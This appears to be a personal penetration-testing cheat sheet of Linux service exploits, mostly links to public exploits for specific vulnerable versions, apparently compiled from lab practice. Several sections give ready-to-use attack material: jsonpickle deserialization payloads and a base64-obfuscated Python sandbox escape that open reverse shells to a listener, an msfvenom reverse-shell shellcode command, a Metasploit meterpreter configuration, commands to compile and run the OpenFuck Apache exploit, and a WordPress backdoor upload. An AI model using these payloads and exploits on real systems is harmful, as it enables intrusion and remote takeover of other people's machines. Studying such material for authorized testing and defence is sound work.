# Linux exploits
## proftpd
Some ftp services like “proftpd” are able to copy and write to the remote filesystem (telnet needs to be used): 
#### links 
- [http://www.proftpd.org/docs/contrib/mod\_copy.html#SITE\_CPFR](http://www.proftpd.org/docs/contrib/mod_copy.html#SITE_CPFR)  
- [https://www.exploit-db.com/exploits/36742](https://www.exploit-db.com/exploits/36742)  
- [https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py](https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py)  
  
#### exploit
```bash
telnet <ip> <port>
site cpfr <path to filename>  
site cptp <path to filename>
```
	
## SFTP
Check if we have write access to the SFTP share:
- https://book.hacktricks.xyz/pentesting/pentesting-ssh
#### We can create a Symlink with a Folder / File and thus gain access to more data:
```bash
symlink / <folder_name>
symlink /var/www/html/index.php index.txt
```
	
## Attacking ADOBE ColdFusion
- https://pentest.tonyng.net/attacking-adobe-coldfusion/
- https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm
- https://www.youtube.com/watch?v=KTn4q7U2MnI
	
## LibreNMS Exploit
- https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/
- https://www.exploit-db.com/exploits/47044
- https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d
- https://www.exploit-db.com/exploits/46970

## Exim Exploit
- https://www.exploit-db.com/exploits/46996

## Abusing JSON pickle object
#### Important link
- https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md
#### Payloads used
```python
{"py/object": "__main__.Shell", "py/reduce": [{"py/function": "os.system"}, ["nc -e /bin/bash 192.168.56.101 5555"], 0, 0, 0]}
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": ["/tmp/bad.sh"]}]}
```
- More details can be found by reading the “Symfonos 4” walkthrough.

## Bypass Python sandbox
#### Important links
- https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
- https://lifesfun101.github.io/2019/12/07/Djinn-walkthrough.html#privilege-escalation-rooute-1
#### Payloads used
```python
eval('__import__("os").system("whoami")')
eval('__import__("os").system("echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xMTUuMTM4IDY2NjYgPi90bXAvZg== | base64 -d | sh")')
```

## Proftpd (Version 1.3.3a)
This FTP server is vulnerable to a remote stack-based buffer overflow.
 More details can be found at those URL:
- https://www.exploit-db.com/exploits/16851
- https://www.exploit-db.com/exploits/15449
 
#### Public exploit
It is also possible to attack the remote machine using a public exploit.
We can find it at the following URL:
 - https://www.exploit-db.com/exploits/15449

But before exploiting the remote vulnerable service, we find a do a minor modification.
It is necessary to change the pre-build shellcode used to execute the reverse shell.
To do that we can use msfvenom:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.47 LPORT=2222 -f perl -b "\x09\x0a\x0b\x0c\x0d\x20\xff" -v lnxcbsc
 # -p: payload
 # LHOST/LPORT: parameters
 # -f: format
 # -b: bad chars
 # -v: var name
``` 
 
#### Using Metasploit:
Metasploit has a build in exploit which gives the attacker an easy way to exploit this vulnerability.

You use this exploit and configure it using the following commands:
```bash
use exploit/linux/ftp/proftp_telnet_iac
set RHOST 10.11.1.146
set RPORT 21
set TARGET 2
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.11.0.47
set LPORT 2222
exploit 
```

## SMB (RCE - version < 2.2.8):
- /usr/share/exploitdb/exploits/multiple/remote/10.c
- https://www.exploit-db.com/exploits/10

## OSSEC (RCE - version 2.8):
- https://www.exploit-db.com/exploits/35234

## MySQL (5.0.77)
Mysql instance shouldn't be executed as root.
There a vulnerability inside MySQL 5.0.77 which give a malicious user a way to priv esc:
- https://www.exploit-db.com/exploits/1518
 
## MongoDB (2.2.3)
The version 2.2.3 is vulnerable to a NOSQL injection which can transforms as a RCE
- https://www.exploit-db.com/exploits/24947

## DavFS2 (1.4.6/1.4.7)
This particular version of DavFS is vulnerable to LPE:
- https://www.exploit-db.com/exploits/28806

## Elastix (2.2.0)
This particular version is vulnerable to a LFI and a RCE:
- https://www.exploit-db.com/exploits/37637
- https://www.exploit-db.com/exploits/18650
Notes: the RCE give you root rights in general (at least the exploit explains how to)

## JWT (Json Web Token)
Important link:
- https://fr.wikipedia.org/wiki/JSON_Web_Token
- https://medium.com/@netscylla/json-web-token-pentesting-890bc2cf0dcd
- https://jwt.io/

## Exploiting ZIP archive:
- https://snyk.io/research/zip-slip-vulnerability
- https://github.com/ptoomey3/evilarc
   - Be caution with the “-d” option, sometimes a big depth parameter could make the exploit fail

## HeartBleed
- https://github.com/mpgn/heartbleed-PoC

## Apache (RCE - version 1.3.23) -> keepnote Barry
exploit links:
- https://www.exploit-db.com/exploits/764
- https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/ (Link to modify exploit)
```bash
# Install libssl1.0-dev instead of libssl-dev 
apt-get install libssl1.0-dev
gcc -o OpenFuck 764.c -lcrypto   
```

Command to exploit: 
We know from our previous enumeration phase this is a RedHat 7.3 with an Apache/1.3.23

```bash
./openfuck 0x73 10.11.1.22
   # Offset to use: 
     # 0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
     # 0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
   # Host to attack:
     # 10.11.1.22
```

## SlideShow 1.4.6 (WordPress, need to be authenticated) 
Important link:
- https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/
Command:
```bash
python slideshow.py -t http://derpnstink.local/weblog/  -u admin -p admin -f backdoor.php
```
